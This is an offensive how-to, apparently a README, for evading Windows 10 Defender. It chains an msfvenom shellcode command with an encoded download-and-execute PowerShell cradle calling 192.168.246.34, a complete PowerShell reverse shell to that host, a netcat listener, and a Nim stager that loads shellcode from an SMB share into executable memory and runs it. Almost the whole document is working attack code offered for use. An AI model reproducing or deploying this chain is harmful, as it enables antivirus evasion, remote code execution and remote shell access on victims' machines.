
 Bypass the windows 10 defender using a stager and a powershell reverse shell.

Steps to reproduce :

### 1. Generating the shellcode :

Generate the shellcode :

```bash
msfvenom -p windows/x64/exec CMD="powershell.exe -w hidden -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADQANgAuADMANAAvAHAAdwBuAC4AcABzADEAIgApAA==" -f raw -o shellcode.bin
```

The base64 payload decodes to this :
```powershell
I E X ( N e w - O b j e c t   N e t . W e b C l i e n t ) . D o w n l o a d S t r i n g ( " h t t p : / / 1 9 2 . 1 6 8 . 2 4 6 . 3 4 / p w n . p s 1 " ) 
```

### 2.  Setting Up the server with a powershell reverse shell.

`pwn.ps1` contains a powershell reverse shell :

```powershell
do {
    Start-Sleep -Seconds 1

    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('192.168.246.34', 443)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'PWN> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()

```

Serve the reverse shell with  python:

```python
python3 -m http.server 80
```

### 3. Setting up the listener :

```bash
nc -nvlp 443
```

### 4. loading the shellcode to the stager :

```python
import winim/lean

  

var filename = "\\\\192.168.246.34\\smb\\shellcode.bin" 

  

var file : File = open(filename, fmRead)

var filesize = file.getFileSize()

  

var shellcode = newSeq[byte](filesize)

  

discard file.readBytes(shellcode, 0, filesize)

  

type

buf* = LPVOID

  
  

var add = VirtualAlloc(nil, filesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

copyMem(add, shellcode[0].addr, filesize)

let f = cast[proc(){.nimcall.}](add)

f()
```

### 5. Setting Up the smbserver with impacket :

```bash
/opt/homebrew/bin/smbserver.py smb <path to the shellcode file> -ts -debug -smb2support
```

### 6. Compiling the stager to an executable :

```python
nim c -d:release --opt:size --cpu:amd64 -d:mingw --app:gui stager.nim
```

### 7.Executing the stager on the target 

Execute the stager on the target to get the shell.
